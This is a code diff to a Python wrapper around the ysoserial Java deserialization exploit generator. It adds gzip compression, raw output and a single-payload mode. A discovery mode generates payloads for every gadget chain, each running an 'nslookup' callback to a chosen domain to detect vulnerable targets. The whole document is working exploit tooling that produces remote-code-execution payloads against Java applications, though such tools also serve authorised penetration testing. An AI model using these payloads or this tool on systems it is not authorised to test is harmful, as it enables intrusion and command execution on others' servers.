@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 import argparse
 import base64
+import gzip
 import os
 import shutil
 import subprocess
@@ -28,12 +29,23 @@ def check_dependencies():
         print(f"Error: JAR not found: {JAR_PATH}", file=sys.stderr)
         sys.exit(1)
 
-def run_ysoserial(payload_type, command):
-    """Executes the JAR file and returns base64 encoded string payload."""
+def run_ysoserial(payload_type, command, compress=False, raw=False):
+    """Executes the JAR file and returns the payload (raw bytes or base64 encoded string)."""
     try:
         cmd = ["java", "-jar", JAR_PATH, payload_type, command]
         result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
-        return base64.b64encode(result.stdout).decode('utf-8')
+        data = result.stdout
+
+        # 1. Apply gzip compression if -c is specified
+        if compress:
+            data = gzip.compress(data)
+
+        # 2. Return raw bytes or base64-encoded string
+        if raw:
+            return data
+        else:
+            return base64.b64encode(data).decode('utf-8')
+
     except subprocess.CalledProcessError as e:
         print(f"Error executing ysoserial for {payload_type}: {e.stderr.decode().strip()}", file=sys.stderr)
         return None
@@ -42,13 +54,32 @@ def main():
     parser = argparse.ArgumentParser(
         description="Ysoserial Payload Generator & Detector Wrapper",
         formatter_class=argparse.RawDescriptionHelpFormatter,
-        epilog=( "Examples:\n" ' %(prog)s CommonsCollections1 "whoami"\n' " %(prog)s -d example.com" ),
+        epilog=(
+            "Examples:\n"
+            "  %(prog)s CommonsCollections1 \"whoami\"\n"
+            "  %(prog)s -c CommonsCollections1 \"whoami\"\n"
+            "  %(prog)s -r CommonsCollections1 \"whoami\"\n"
+            "  %(prog)s -c -r CommonsCollections1 \"whoami\"\n"
+            "  %(prog)s -d example.com"
+        ),
     )
 
     parser.add_argument(
         "-d",
         "--domain",
         help="Run discovery mode targeting this domain",
+    )
+    parser.add_argument(
+        "-c",
+        "--compress",
+        action="store_true",
+        help="Gzip compress the payload data before base64 encoding",
+    )
+    parser.add_argument(
+        "-r",
+        "--raw",
+        action="store_true",
+        help="Output raw data from ysoserial (skip base64 encoding)",
     )
 
     args, remaining = parser.parse_known_args()
@@ -62,12 +93,26 @@ def main():
 
         for payload in PAYLOADS:
             test_input = f"nslookup {payload}.{args.domain}"
-            output = run_ysoserial(payload, test_input)
-            if output:
+            output = run_ysoserial(payload, test_input, compress=args.compress, raw=args.raw)
+            if output is not None:
+                if args.raw:
+                    sys.stdout.buffer.write(output)
+                else:
+                    print(output)
+        return
+
+    # 2. Single payload generation mode (e.g. script.py Payload "command")
+    if len(remaining) == 2:
+        payload_type, command = remaining
+        output = run_ysoserial(payload_type, command, compress=args.compress, raw=args.raw)
+        if output is not None:
+            if args.raw:
+                sys.stdout.buffer.write(output)
+            else:
                 print(output)
         return
 
-    # 2. Unified execution mode (Handles both specific payload pairs and 0-argument help)
+    # 3. Fallback execution mode (handles list, help, or other ysoserial arguments)
     try:
         result = subprocess.run(
             ["java", "-jar", JAR_PATH, *remaining],
